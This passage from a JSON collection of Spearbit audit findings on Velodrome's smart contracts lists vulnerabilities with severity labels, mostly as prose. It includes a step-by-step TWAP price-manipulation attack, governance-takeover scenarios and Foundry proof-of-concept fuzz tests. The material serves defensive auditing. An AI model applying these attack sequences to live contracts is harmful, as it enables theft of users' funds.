        "body": "The depositFor function was found to accept NFT of all types (normal, locked, managed) without restriction. function depositFor(uint256 _tokenId, uint256 _value) external nonReentrant { LockedBalance memory oldLocked = _locked[_tokenId]; require(_value > 0, \"VotingEscrow: zero amount\"); require(oldLocked.amount > 0, \"VotingEscrow: no existing lock found\"); require(oldLocked.end > block.timestamp, \"VotingEscrow: cannot add to expired lock, withdraw\"); _depositFor(_tokenId, _value, 0, oldLocked, DepositType.DEPOSIT_FOR_TYPE); } Instance 1 - Anyone can call depositFor against a locked NFT Users should not be allowed to increase the voting power of a locked NFT by calling the depositFor function as locked NFTs are not supposed to vote. Thus, any increase in the voting balance of locked NFTs will not increase the gauge weight, and as a consequence, the influence and yield of the deposited VELO will be diminished. In addition, the locked balance will be overwritten when the veNFT is later withdrawn from the managed veNFT, resulting in a loss of funds. Instance 2 - Anyone can call depositFor against a managed NFT Only the RewardsDistributor.claim function should be allowed to call depositFor function against a managed NFT to process rebase rewards claimed and to compound the rewards into the LockedManagedReward contract. However, anyone could also increase the voting power of a managed NFT directly by calling depositFor with a tokenId of a managed NFT, which breaks the invariant.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Lack of vetoer can lead to 51% attack",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The veto power is important functionality in a governance system in order to protect from malicious proposals. However there is lack of vetoer in VeloGovernor , this might lead to Velodrome losing their veto power unintentionally and open to 51% attack. With 51% attack a malicous actor can change the governor in Voter contract or by pass the tokens whitelist adding new gauge with malicious token. References  dialectic.ch/editorial/nouns-governance-attack-2  code4rena.com/reports/2022-09-nouns-builder/#m-11-loss-of-veto-power-can-lead-to-51-attack",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Compromised or malicious owner can siphon rewards from the Voter contract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The createGauge() function takes a _gaugeFactory parameter which is checked to be approved by the FactoryRegistry contract. However, the owner of this contract can approve any arbitrary FactoryRegistry contract, hence the return value of the IGaugeFactory(_gaugeFactory).createGauge() call may return an EOA which steals rewards every time notifyRewardAmount() is called.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing nonReentrant modifier on a state changing checkpoint function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The checkpoint() function will call the internal _checkpoint() function which ultimately fills the point history and potentially updates the epoch state variable.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Close to half of the trading fees may be paid one epoch late",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Due to how left() is implemented in Reward (returning the total amount of rewards for the epoch), _claimFees() will not queue rewards until the new fees are greater than the current ones for the epoch. This can cause the check to be false for values that are up to half minus one reward. Consider the following example:  First second of a new epoch, we add 100 rewards.  For the rest of the epoch, we accrue 99.99 rewards.  The check is always false, the 99 rewards will not be added to this epoch, despite having accrued them during this epoch.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Not synced with Epochs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "If there's enough delays in calling the notifyRewardAmount() function, a full desync can happen.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Dust losses in notifyRewardAmount",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "This should cause dust losses which are marginal but are never queued back. See private link to code-423n4/2022-10-3xcalibur-findings#410. Vs SNX implementation which does queue the dust back. Users may be diluted by distributing the _leftover amount of another epoch period of length DURATION if the total supply deposited in the gauge continues to increase over this same period. On the flip side, they may also benefit if users withdraw funds from the gauge during the same epoch.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "All rewards are lost until Gauge or Bribe deposits are non-zero",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Flagging this old finding which is still valid for all SNX like gauges. See private link to code- 423n4/2022-10-3xcalibur-findings#429. Because the rewards are emitted over DURATION, if no deposit has happened and notifyRewardAmount() is called with a non-zero value, all rewards will be forfeited until totalSupply is non-zero as nobody will be able to claim them.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Difference in getPastTotalSupply and propose",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The getPastTotalSupply() function currently uses block.number, but OpenZeppelin's propose() function will use votes from block.timestamp - 1 as seen here. This could enable  Front-run and increase total supply to cause proposer to be unable to propose().  Require higher tokens than expected if total supply can grow within one block. Proposals could be denied as long as a whale is willing to lock more tokens to increase the total supply and thereby increase the proposal threshold.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Delaying update_period may award more emissions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "First nudge can be performed on the first tail period, delaying update_period() may award more emissions, because of the possible delay with the first proposal, waiting to call update_period() will allow the use of the updated nudged value. This is marginal (1BPS in difference)",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Incorrect math for future factories and pools",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Because quoteLiquidity() assumes an x * y = k formula, its quote value will be incorrect when using a custom factory that uses a different curve. //Router.sol#L673-L700 function _quoteZapLiquidity( address tokenA, address tokenB, bool stable, address _factory, uint256 amountADesired, uint256 amountBDesired, uint256 amountAMin, uint256 amountBMin ) internal view returns (uint256 amountA, uint256 amountB) { require(amountADesired >= amountAMin); require(amountBDesired >= amountBMin); (uint256 reserveA, uint256 reserveB) = getReserves(tokenA, tokenB, stable, _factory); if (reserveA == 0 && reserveB == 0) { (amountA, amountB) = (amountADesired, amountBDesired); } else { uint256 amountBOptimal = quoteLiquidity(amountADesired, reserveA, reserveB); if (amountBOptimal <= amountBDesired) { require(amountBOptimal >= amountBMin, \"Router: insufficient B amount\"); (amountA, amountB) = (amountADesired, amountBOptimal); } else { uint256 amountAOptimal = quoteLiquidity(amountBDesired, reserveB, reserveA); assert(amountAOptimal <= amountADesired); require(amountAOptimal >= amountAMin, \"Router: insufficient A amount\"); (amountA, amountB) = (amountAOptimal, amountBDesired); } } } The math may be incorrect for future factories and pools, while the current math is valid for x * y = k, any new AMM math (e.g Bounded / V3 math, Curve V2, Oracle driven AMMs) may turn out to be incorrect. This may cause issues when performing zaps with custom factories.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Add function to remove whitelisted token and NFT",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "In the Voter contract, the governor can only add tokens and NFTs to the whitelist array. However, it is missing the functionality to remove whitelisted tokens and NFTs. If any whitelisted token or NFT has an issue, it cannot be removed from the list.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Unnecessary approve in Router",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The newly added Zap feature uses max approvals, which are granted to pairs. However, the Pair contract does not pull tokens from the router, and therefore unnecessarily calls approve() in the router. Because of the possibility of specifying a custom factory, attackers will be able to set up approvals from any token to their contracts. This may be used to scam end-users, for example by performing a swap on these malicious factories.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The current value of a Pair is not always returning a 30-minute TWAP and can be manipulated.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The current function returns a current TWAP. It fetches the last observation and calculates the TWAP between the last observation. The observation is pushed every thirty minutes. However, the interval between current timestamp and the last observation varies a lot. In most cases, the TWAP interval is shorter than 30 minutes. //Pair.sol#L284-L288 uint256 timeElapsed = block.timestamp - _observation.timestamp; @audit: timeElapsed can be much smaller than 30 minutes. uint256 _reserve0 = (reserve0Cumulative - _observation.reserve0Cumulative) / timeElapsed; uint256 _reserve1 = (reserve1Cumulative - _observation.reserve1Cumulative) / timeElapsed; amountOut = _getAmountOut(amountIn, tokenIn, _reserve0, _reserve1); If the last observation is newly updated, the timeElapsed will be much shorter than 30 minutes. The cost of price manipulation is cheaper in this case. Assume the last observation is updated at T. The exploiter can launch an attack at T + 30_MINUTES - 1 1. At T + 30_MINUTES - 1, the exploiter tries to manipulate the price of the pair. Assume the price is moved to 100x. 2. At T + 30_MINUTES, the exploiter pokes the pair. The pair push an observation with the price = 100x. 3. At T + 30_MINUTES + 1, the exploiter tries to exploit external protocols. The current function fetches the It ends up last observation and calculates the TWAP between the last observation and the current price. calculating the two-block-interval TWAP.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Calculation error of getAmountOut leads to revert of Router",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The function getAmountOut in Pair calculates the correct swap amount and token price. //Pair.sol#L442-L444 function _f(uint256 x0, uint256 y) internal pure returns (uint256) { return (x0 * ((((y * y) / 1e18) * y) / 1e18)) / 1e18 + (((((x0 * x0) / 1e18) * x0) / 1e18) * y) / ,! 1e18; } //Pair.sol#L450-L476 function _get_y( uint256 x0, uint256 xy, uint256 y ) internal pure returns (uint256) { for (uint256 i = 0; i < 255; i++) { uint256 y_prev = y; uint256 k = _f(x0, y); if (k < xy) { uint256 dy = ((xy - k) * 1e18) / _d(x0, y); y = y + dy; } else { uint256 dy = ((k - xy) * 1e18) / _d(x0, y); y = y - dy; } if (y > y_prev) { if (y - y_prev <= 1) { return y; } } else { if (y_prev - y <= 1) { return y; } } } return y; } The getAmountOut is not always correct. This results in the router unexpectedly revert a regular and correct transaction. We can find one parameter that the router will fail to swap within 5s fuzzing. 36 function testAmountOut(uint swapAmount) public { vm.assume(swapAmount < 1_000_000_000 ether); vm.assume(swapAmount > 1_000_000); uint256 reserve0 = 100 ether; uint256 reserve1 = 100 ether; uint amountIn = swapAmount - swapAmount * 2 / 10000; uint256 amountOut = _getAmountOut(amountIn, token0, reserve0, reserve1); uint initialK = _k(reserve0, reserve1); reserve0 += amountIn; reserve1 -= amountOut; console.log(\"initial k:\", initialK); console.log(\"curent k:\", _k(reserve0, reserve1)); console.log(\"curent smaller k:\", _k(reserve0, reserve1 - 1)); require(initialK < _k(reserve0, reserve1), \"K\"); require(initialK > _k(reserve0, reserve1-1), \"K\"); } After the fuzzer have a counter example of swapAmount = 1413611527073436 We can test that the Router will revert if given the fuzzed params. contract PairTest is BaseTest { function testRouterSwapFail() public { Pair pair = Pair(factory.createPair(address(DAI), address(FRAX), true)); DAI.approve(address(router), 100 ether); FRAX.approve(address(router), 100 ether); _addLiquidityToPool( address(this), address(router), address(DAI), address(FRAX), true, 100 ether, 100 ether ); uint swapAmount = 1413611527073436; DAI.approve(address(router), swapAmount); // vm.expectRevert(); console.log(\"fee:\", factory.getFee(address(pair), true)); IRouter.Route[] memory routes = new IRouter.Route[](1); routes[0] = IRouter.Route(address(DAI), address(FRAX), true, address(0)); uint daiAmount = DAI.balanceOf(address(pair)); uint FRAXAmount = FRAX.balanceOf(address(pair)); console.log(\"daiAmount: \", daiAmount, \"FRAXAmount: \", FRAXAmount); vm.expectRevert(\"Pair: K\"); router.swapExactTokensForTokens(swapAmount, 0, routes, address(owner), block.timestamp); } }",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "VotingEscrow checkpoints is not synchronized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Delegating token ids is not synchronizing correctly fromBlock variable in the checkpoint, by leaving it not updated the functions getPastVotesIndex and _findWhatCheckpointToWrite could return the incorrect index.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Wrong proposal expected value in VeloGovernor",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The expected values of MAX_PROPOSAL_NUMERATOR and proposalNumerator are incorrect, in the current implementation max proposal is set to 0.5%, the expected value is 5%, and the proposal numerator starts at 0.02%, and not at 0.2% as expected.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "_burn function will always revert if the caller is the approved spender",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The owner or the approved spender is allowed to trigger the _burn function. However, whenever an approved spender triggers this function, it will always revert. This is because the _removeTokenFrom function will revert internally if the caller is not the owner of the NFT as shown below. function _removeTokenFrom(address _from, uint256 _tokenId) internal { // Throws if `_from` is not the current owner assert(idToOwner[_tokenId] == _from); As a result, an approved spender will not be able to withdraw or merge a veNFT on behalf of the owner because the internal _burn function will always revert.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "OpenZeppelin's Clones library can be used to cheaply deploy rewards contracts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "OpenZeppelin's Clones library allows for significant gas savings when there are multiple deploy- ments of the same family of contracts. This would prove useful in several factory contracts which commonly deploy the same type of contract. Minimal proxies make use of the same code even when initialization data may be different for each instance. By pointing to an implementation contract, we can delegate all calls to a fixed address and minimise deployment costs.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "VelodromeTimeLibrary functions can be made unchecked",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Running the following fuzz test pragma solidity 0.8.13; import \"forge-std/Test.sol\"; contract VelodromeTimeLibrary { uint256 public constant WEEK = 7 days; /// @dev Returns start of epoch based on current timestamp function epochStart(uint256 timestamp) public pure returns (uint256) { unchecked { return timestamp - (timestamp % WEEK); } } /// @dev Returns unrestricted voting window function epochEnd(uint256 timestamp) public pure returns (uint256) { unchecked { 40 return timestamp - (timestamp % WEEK) + WEEK - 1 hours; } } } contract VelodromeTimeLibraryTest is Test { VelodromeTimeLibrary vtl; uint256 public constant WEEK = 7 days; function setUp() public { vtl = new VelodromeTimeLibrary(); } function testEpochStart(uint256 timestamp) public { uint256 uncheckedVal = uint256 normalVal = timestamp - (timestamp % WEEK); assertEq(uncheckedVal, normalVal); vtl.epochStart(timestamp); } function testEpochEnd(uint256 timestamp) public { uint256 uncheckedVal = vtl.epochEnd(timestamp); uint256 normalVal = timestamp - (timestamp % WEEK) + WEEK - 1 hours; assertEq(uncheckedVal, normalVal); } } One can see that both VelodromeTimeLibrary functions will only start to overflow at a ridiculously high timestamp input.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Skip call can save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "distribute(address[] memory _gauges) is meant to be used for multiple gauges but it calls minter.update_period before each call to notifyRewardAmount",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Change to zero assignment to save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "It is not necessary to subtract the total value from the votes instead you should set it directly to zero.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Refactor to skip an SLOAD",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "It is possible to skip an SLOAD by refactoring the code as it is in recommendation.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Tail variable can be removed to save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "It is possible to save gas by freeing the tail slot, which can be replaced by check weekly < TAIL_- START",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use a bitmap to store nudge proposals for each epoch",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The usage of a bitmap implementation for boolean values can save a significant amount of gas. The proposals variable can be indexed by each epoch which should only increment once per week.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "isApproved function optimization",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Because settings are all known, you could do an if-check in memory rather than in storage, by validating first the fallback settings. The recommended implementation will become cheaper for the base case, negligibly more expensive in other cases ~10s of gas",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use calldata instead of memory to save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Using calldata avoids copying the value into memory, reducing gas cost",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Cache store variables when used multiple times",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Storage loads are very expensive compared to memory loads, storage values that are read multiple times should be cached avoiding multiple storage loads. In SinkManager contract use multiple times the storage variable ownedTokenId",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Add immutable to variable that don't change",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Using immutable for variables that do not changes helps to save on gas used. The reason has been that immutable variables do not occupy a storage slot when compiled, they are saved inside the contract byte code.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use Custom Errors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "As one can see here: \"there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., revert(\"Insufficient funds.\");), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.\"",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Cache array length outside of loop",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "If not cached, the solidity compiler will always read the length of the array during each iteration. That is, if it is a storage array, this is an extra sload operation (100 additional extra gas for each iteration except for the first) and if it is a memory array, this is an extra mload operation (3 additional gas for each iteration except for the first).",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Withdrawing from a managed veNFT locks the user's veNFT for the maximum amount of time",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "A user may deposit their veNFT through the depositManaged() function with any unlock time value. However, upon withdrawing, the unlock time is automatically configured to (block.timestamp + MAXTIME / WEEK) * WEEK. This is poor UX and it does not give users much control over the expiry time of their veNFT.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "veNFT split functionality can not be disabled",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Once split functionality has been enabled via the enableSplitForAll(), it is not possible to disable this feature in the future. It does not pose any additional risk to have it disabled once users have already split their veNFTs because the protocol allows for these locked amounts to be readily withdrawn upon expiry.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Anyone can notify the FeesVotingReward contract of new rewards",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "While the BribeVotingReward contract intends to allow bribes from anyone, the FeesVotingReward contract is designed to receive fees from just the Gauge contract. This is inconsistent with other reward contracts like LockedManagedReward.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing check in merge if the _to NFT has voted",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The merge() function is used to combine a _from VeNFT into a _to veNFT. It starts with a check on if the _from VeNFT has voted or not. However, it doesn't check if the _to VeNFT has voted or not. This will cause the user to have less voting power, leaving rewards and/or emissions on the table, if they don't call poke() || reset(). Although this would only be an issue for an unaware user. An aware user would still have to waste gas on either of the following: 1. An extra call to poke() || reset(). 2. Vote with the _to veNFT and then call merge().",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Ratio of invariant _k to totalSupply of the AMM pool may temporarily decrease",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The burn function directly sends the reserve pro-rated to the liquidity token. This is a simple and elegant way. Nevertheless, two special features of the current AMM would lead to a weird situation. 1. The fee of the AMM pool is sent to the fee contract instead of being absorbed into the pool; 2. The stable pool's curve x3y + y3x have a larger rounding error compare to uni-v2's constant product formula. The invariant K in a stable pool can decrease temporarily when a user performs certain actions like minting a token, doing a swap, and withdrawing liquidity. This means that the ratio of K to the total supply of the pool is not monotonously increasing. In most cases, this temporary decrease is negligible and the ratio of K to the total supply of the pool will eventually increase again. However, the ratio of K to the total supply is an important metric for calculating the value of LP tokens, which are used in many protocols. If these protocols are not aware of the temporary decrease in the K value, they may suffer from serious issues (e.g. overflow). The root cause of this issue is: there are always rounding errors when using \"balance\" to calculate invariant k. Sometimes, the rounding error is larger. if an lp is minted when the rounding error is small (ratio of amount: k is small) and withdrawn when the rounding error is large (ratio of amount: k is large). The total invariant decreased. We can find a counter-example where the invariant decrease. function testRoundingErrorAttack(uint swapAmount) public { // The counter-example: swapAmount = 52800410888861351333 vm.assume(swapAmount < 100_000_000 ether); vm.assume(swapAmount > 10 ether); uint reserveA = 10 ether; uint reserveB = 10 ether; uint initialK = _k(reserveA, reserveB); reserveA *= 2; reserveB *= 2; uint tempK = _k(reserveA, reserveB); reserveB -= _getAmountOut(swapAmount, token0, reserveA, reserveB); reserveA += swapAmount; vm.assume(tempK <= _k(reserveA, reserveB)); reserveA -= reserveA / 2; reserveB -= reserveB / 2; require(_k(reserveA, reserveB) > } initialK, \"Rounding error attack!\"); 47",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inconsistent check for adding value to a lock",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "depositFor allows anyone to add value to an existing lock However increaseAmount, which for NORMAL locks is idempotent, has a check to only allow an approved or Owner to increase the amount.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Privileged actors are incentivized to front-run each other",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Privileged actors are incentivized to front-run each other and vote at the last second, because of the FIFS OP sequencer, managers will try to vote exactly at the penultimate block in order to maximize their options (voting can only be done once)",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "First nudge propose must happen one epoch before tail is set to true",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Because you can only propose a nudge one epoch in advance, the first propose call will need to happen on the last epoch in which tail is set to false While the transaction simulation will fail for execute, the EpochGovernor.propose math will make it so that the first proposal will have to be initiated an epoch before in order for it to be executable on the first tail epoch",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing emit important events",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The contracts that change or create sensible information should emit an event.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Marginal rounding errors when using small values",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "It may be helpful to encourage end users to use BPS or higher denominations for weights when dealing with multiple gauges to keep precision high. Due to widespread usage of the _vote function throughout the codebase and in forks, it may be best to suggest this in documentation to avoid reverts",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Prefer to use nonReentrant on external functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "it may be best to use nonReentrant on the external functions rather than the internal ones. Vote, for example, is not protected because the internal function is.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Redundant variable update",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "In notifyRewardAmount the variable lastUpdateTime is updated twice",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Turn logic into internal function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "In Gauge contract the logic to update rewardPerTokenStored,lastUpdateTime,rewards,userRewardsPerTokenPaid can be converted to internal function for simplicity",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add extra slippages on client-side when dependent paths are used in generateZapInParams",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "generateZapInParams is a helper function in Router that calculates the parameters for zapIn. there's a duplicate pair in RoutesA and RoutesB, the value calculated here would be off. For example, The optimal path to swap dai into usdc/velo pair would likely have dai/eth in both routesA and routesB. When the user uses this param to call zapIn, it executes two swaps: dai -> eth -> usdc, and dai -> eth -> velo. As the price of dai/eth is changed after the first swap, the second swap would have a slightly bad price. The zapIn will likely revert as it does not meet the min token return. If",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unnecessary skim in router",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The pair contract absorbs any extra tokens after swap, mint, and burn. Triggering Skim after burn/mint would not return extra tokens.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Overflow is not desired and can lead to loss of funds in Solidity 8.0.0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "In solidity 8.0, overflow of uint is defaulted to be reverted. //Pair.sol#L235-L239 uint256 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) { reserve0CumulativeLast += _reserve0 * timeElapsed; reserve1CumulativeLast += _reserve1 * timeElapsed; } reserve0CumulativeLast += _reserve0 * timeElapsed; This calculation will overflow and DOS the pair if _- reserve0 is too large. As a result, the pool should not support high decimals tokens.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unnecessary casting",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "_totalWeight is already declared as uint256",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Refactor retrieve current epoch into library",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Could refactor to a library function to retrieve the current epoch",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add governor permission to sensible functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Some functions that change important variables could add governor permission to enable changes. The function setManagedState in VotingEscrow is one that is recommended to add governor permission.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Admin privilege through proposal threshold",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "As an Admin Privilege of the Team, the variable proposalNumerator could change causing the proposalThreshold to be higher than expected. The Team could front-run calls to propose and increase the numerator, this could block proposals",
        "labels": [
